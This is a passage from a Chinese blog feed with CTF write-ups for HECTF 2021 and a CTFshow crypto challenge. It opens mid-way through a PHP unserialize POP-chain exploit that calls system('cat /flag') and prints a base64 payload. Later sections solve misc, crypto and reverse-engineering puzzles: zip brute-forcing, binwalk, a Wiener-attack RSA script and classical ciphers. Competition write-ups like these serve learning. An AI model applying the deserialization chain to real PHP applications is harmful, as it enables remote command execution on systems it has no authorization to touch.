class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">=</span> $fake<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>value <span class="token operator">===</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>nice<span class="token operator">-</span><span class="token operator">></span>cc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>test<span class="token operator">-</span><span class="token operator">></span><span class="token function">good</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">public</span> $value <span class="token operator">=</span> <span class="token string">"\system"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">public</span> $array <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>		$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">good</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>array<span class="token punctuation">)</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            echo <span class="token string">'must_array'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">public</span> $value <span class="token operator">=</span> <span class="token string">"cat /flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token parameter">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span>$func<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>            <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">'y0u_A2e_HacKK!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>            <span class="token function">$func</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>$a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>echo <span class="token function">serialize</span><span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>echo <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>echo <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><h2 id="misc"><a class="anchor" href="#misc">#</a> misc</h2>
<h3 id="快来公众号ya"><a class="anchor" href="#快来公众号ya">#</a> 快来公众号 ya</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222748980-1107695173.png" alt="image" /></p>
<p>扫码即可</p>
<h3 id="jamesharden"><a class="anchor" href="#jamesharden">#</a> JamesHarden</h3>
<p>附件下载解压后修改文件后缀，加上.zip 后解压文件是是一个.class 文件：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222901436-179167112.png" alt="image" /></p>
<p>对 URPGS {Jr1p0zr_G0_U3pg6_!} 进行 rot13 解密得到 flag：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222913142-1050466987.png" alt="image" /></p>
<h3 id="捉迷藏"><a class="anchor" href="#捉迷藏">#</a> 捉迷藏</h3>
<p>附件打开文件为一个 word 文档</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222938925-832389837.png" alt="image" /></p>
<p>根据文字提示，将作文内容字体大小改为 12</p>
<p>发现为 jsfuck 加密</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114222953436-1761390993.png" alt="image" /></p>
<p><span class="exturl" data-url="aHR0cDovL2NvZGVydGFiLmNvbS9Kc1VuRnVjayVFNSU5QyVBOCVFNyVCQSVCRiVFNyVCRCU5MSVFNyVBQiU5OSVFNCVCOCVBRCVFOCVBNyVBMyVFNSVBRiU4Ng==">http://codertab.com/JsUnFuck 在线网站中解密</span></p>
<p>解密得到 flag</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223005283-1218598132.png" alt="image" /></p>
<h3 id="迷途的狗狗"><a class="anchor" href="#迷途的狗狗">#</a> 迷途的狗狗</h3>
<p>附件打开</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223022687-2033165176.png" alt="image" /></p>
<p>打开迷途的狗狗文件夹</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223036598-81117398.png" alt="image" /></p>
<p>压缩包中有一张图片，但是需要密码</p>
<p>在 ziperello 中使用暴力破击，字符集设定为数字</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223047333-512534950.png" alt="image" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223056484-1083480393.png" alt="image" /></p>
<p>得到密码为 142345，成功解压文件得到一张图片</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223109875-741763226.png" alt="image" /></p>
<p>在 kali 中使用 binwalk 分析文件内容</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223123138-908391527.png" alt="image" /></p>
<p>发现隐藏图片中隐藏了一个 jpg 文件</p>
<p>使用 foremost 分离文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223134729-1362281137.png" alt="image" /></p>
<p>第二张图片中显示 flag</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223144607-731012539.png" alt="image" /></p>
<h3 id="snake"><a class="anchor" href="#snake">#</a> snake</h3>
<p>玩到 6000 分给了个提示</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223210251-1771729246.png" alt="image" /></p>
<p>溯源找到源码</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223219200-373798834.png" alt="image" /></p>
<p>重新修改 show_text 函数</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223237584-2129485803.png" alt="image" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223252907-736145641.png" alt="image" /></p>
<p>进行 pyinstaller 反打包后有个 snake.pyc，pyc 反编译成 py 后就是它的源码</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223305798-2102838000.png" alt="image" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223319885-1495512728.png" alt="image" /></p>
<p>得到 flag：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223334853-1498515998.png" alt="image" /></p>
<h3 id="问卷调查"><a class="anchor" href="#问卷调查">#</a> 问卷调查</h3>
<p>简简单单签个退吧就，下次继续。</p>
<h2 id="crypto"><a class="anchor" href="#crypto">#</a> crypto</h2>
<h3 id="签到"><a class="anchor" href="#签到">#</a> 签到</h3>
<p>附件打开</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223408762-1613593406.png" alt="image" /></p>
<p>与佛论禅解密得到一串 base64 密文</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>SkJDVUdWQ0dQTlRXNjMzRUw1V0hLWTNMTDVURzY0UzdQRlhYSzdJPQ<span class="token operator">==</span></pre></td></tr></table></figure><p>解密后再 base32 解密得到 flag：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223422547-1772196661.png" alt="image" /></p>
<h3 id="rsa_e_n"><a class="anchor" href="#rsa_e_n">#</a> RSA_e_n</h3>
<p>附件：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223436375-881610782.png" alt="image" /></p>
<p>rsa 中的 e,n,c 解密，直接上脚本：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> RSAwienerHacker</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x14b367bf01efd4dc667b8e62975479c612c96e78f7f1f55242b2973c882ddcb33a65c52174d8ae1273764ce429054ea3f2fdc38ff205443c92ef4198739f05aa11fc10d3fc6ff30c8f5f05a04f43e3d8fc9bfffe916b2e0360560a162729e91b7775bda70177e0f875626e0a81bd4eacea9948b02232a82659f8d9aa9b4c754f</span></pre></td></tr><tr><td data-num="5"></td><td><pre>n <span class="token operator">=</span> <span class="token number">0x75be564267f8bf6c2038dd0cadfeecbc3158acfc27e679dd0bdb0db0e90bd5198a0a7edc0626f357a2d75f3c37ede045b7f7ca6bda79e5bf6fc0aea0aa7beda587388599d2b77b538fc3e666784493ffaf731e2ae232e8e9e9f9f2a4df25c19b7680f5bf6c485bd87923f01c17d8ec35438772c28e361774e6e7681d67ecbe19</span></pre></td></tr><tr><td data-num="6"></td><td><pre>c <span class="token operator">=</span> <span class="token number">10127659956533419108589656976567211166527205183773088147543122705230809548550336271584049969380709512046523116316965506372940655242616078713681678662841367955124154879878984026023241163358487655249424233120021240245459984899558747887087199609289148343740081670749999484769650710161617077523656215330005636913</span></pre></td></tr><tr><td data-num="7"></td><td><pre>#爆破d</pre></td></tr><tr><td data-num="8"></td><td><pre>d <span class="token operator">=</span> RSAwienerHacker<span class="token punctuation">.</span><span class="token function">hack_RSA</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">powmod</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span><span class="token function">unhexlify</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>解得 flag：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223452932-116521713.png" alt="image" /></p>
<h3 id="tool"><a class="anchor" href="#tool">#</a> Tool</h3>
<p>附件：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223505160-849395067.png" alt="image" /></p>
<p>看上去是一串乱码，但是不难看出是维吉尼亚，直接丢在线网站得到 key</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223517069-1701511266.png" alt="image" /></p>
<p>根据恢复后的最后一段提示：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Well<span class="token punctuation">,</span> you already know that <span class="token keyword">this</span> is Virginia encryption<span class="token punctuation">,</span> but unfortunately<span class="token punctuation">,</span> the ultimate goal is not to <span class="token keyword">get</span> plaintext<span class="token punctuation">,</span> but to <span class="token keyword">get</span> the key<span class="token punctuation">.</span> For the flag <span class="token keyword">of</span> <span class="token keyword">this</span> question<span class="token punctuation">,</span> you need to add an underscore <span class="token keyword">in</span> the middle <span class="token keyword">of</span> the key<span class="token punctuation">,</span> and then add the flag standard format to it<span class="token punctuation">,</span> and you can submit it<span class="token punctuation">.</span></pre></td></tr></table></figure><p>在中间加入下划线即可得到 flag</p>
<h3 id="encode"><a class="anchor" href="#encode">#</a> encode</h3>
<p>附件：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223532960-239563614.png" alt="image" /></p>
<p>emoji 表情加密，直接在线解，得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">你好呀，送你串字符吧</span><span class="token operator">:</span>ɯlxɹƃluʌ‾ʌdɹo‾ɟlq‾lʍ <span class="token operator">:</span> dǝʇs ʇsɐl</pre></td></tr></table></figure><p>文本倒序得到下一步：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223547209-636405504.png" alt="image" /></p>
<p>根据题目提示《逾越节的阴谋》</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223555933-317357979.png" alt="image" /></p>
<p>可以知道是埃特巴什密码，解码后即可得到 flag。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223605940-523504742.png" alt="image" /></p>
<p>出题人 flag 改慢了 emmmmm，血没了，暴打出题人。</p>
<h2 id="re"><a class="anchor" href="#re">#</a> re</h2>
<h3 id="hard"><a class="anchor" href="#hard">#</a> hard</h3>
<p>附件文本格式打卡，直接搜 HECTF 即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223619495-639797158.png" alt="image" /></p>
<h2 id="pwn"><a class="anchor" href="#pwn">#</a> pwn</h2>
<h3 id="签到-2"><a class="anchor" href="#签到-2">#</a> 签到</h3>
<p>用 wirshark 追踪 tcp 流</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211114223639490-1187703509.png" alt="image" /></p>
<h1 id="感言"><a class="anchor" href="#感言">#</a> 感言</h1>
<p>HECTF 可以说是我梦开始的地方，打的第一场比赛就是 2020HECTF，也就是一年前吧，那会刚入圈子，ctf 也还是刚接触，那会连栅栏都不知道是什么 QAQ！！！菜鸡自进阶 2333</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow月饼杯Crypto2_月自圆WP</title>
    <url>/article/dcbf7c1a.html</url>
    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYuc2hvdy9jaGFsbGVuZ2VzI2NyeXB0bzJfJUU2JTlDJTg4JUU4JTg3JUFBJUU1JTlDJTg2LTQ4NA==">题目链接</span></p>
<p>加密脚本 <code>Baby(Don't)Cry.py</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span>utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="2"></td><td><pre>#Author<span class="token operator">:</span> Lazzaro</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>from itertools <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="5"></td><td><pre>from random <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="6"></td><td><pre>from string <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>def <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	c<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		c<span class="token operator">+=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">zfill</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">return</span> c</pre></td></tr><tr><td data-num="13"></td><td><pre>	</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	m <span class="token operator">=</span> <span class="token string">'****************************************************flag&#123;*************&#125;'</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">71</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	a <span class="token operator">=</span> <span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	salt <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token function">sample</span><span class="token punctuation">(</span>ascii_uppercase<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	si <span class="token operator">=</span> <span class="token function">cycle</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	c<span class="token operator">=</span><span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	</pre></td></tr><tr><td data-num="23"></td><td><pre>#3472184e657e50561c481f5c1c4e1938163e154431015e13062c1b073d4e3a444f4a5c5c7a071919167b034e1c29566647600c4e1c2956661b6c1f50622f0016317e563546202a</pre></td></tr></table></figure><p>根据加密程序可以知道明文长度为 <code>71</code>  位，加密后为 <code>142</code>  位。<br />
这里由于 a 不大，salt 长度也不长，且明文 m 中存在 flag，正好可以用这几位去爆破出 a 和 salt。<br />
flag 在明文 m 中的位置是 53，对应密文 c 中的位置是 105。flag 出现的位置正好对应 salt 的位置。</p>
<p>爆破 a：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from random <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>from string <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>from itertools <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>def <span class="token function">decrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	c<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		c<span class="token operator">+=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">zfill</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">return</span> c</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>		<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token literal-property property">ascii_uppercase</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>			si <span class="token operator">=</span> <span class="token function">cycle</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>			# <span class="token keyword">if</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'1c'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>			# 	<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'i ='</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'\tj ='</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>			<span class="token keyword">if</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'29'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>				<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'i ='</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'\tj ='</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span></pre></td></tr></table></figure><p>满足 <code>encrypt('f', i, si)=='1c'</code>  的结果：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>i <span class="token operator">=</span> <span class="token number">52</span> 	j <span class="token operator">=</span> <span class="token constant">D</span></pre></td></tr><tr><td data-num="2"></td><td><pre>i <span class="token operator">=</span> <span class="token number">57</span> 	j <span class="token operator">=</span> <span class="token constant">F</span></pre></td></tr><tr><td data-num="3"></td><td><pre>i <span class="token operator">=</span> <span class="token number">62</span> 	j <span class="token operator">=</span> <span class="token constant">H</span></pre></td></tr><tr><td data-num="4"></td><td><pre>i <span class="token operator">=</span> <span class="token number">67</span> 	j <span class="token operator">=</span> <span class="token constant">J</span></pre></td></tr><tr><td data-num="5"></td><td><pre>i <span class="token operator">=</span> <span class="token number">72</span> 	j <span class="token operator">=</span> <span class="token constant">L</span></pre></td></tr><tr><td data-num="6"></td><td><pre>i <span class="token operator">=</span> <span class="token number">77</span> 	j <span class="token operator">=</span> <span class="token constant">N</span></pre></td></tr><tr><td data-num="7"></td><td><pre>i <span class="token operator">=</span> <span class="token number">82</span> 	j <span class="token operator">=</span> <span class="token constant">P</span></pre></td></tr><tr><td 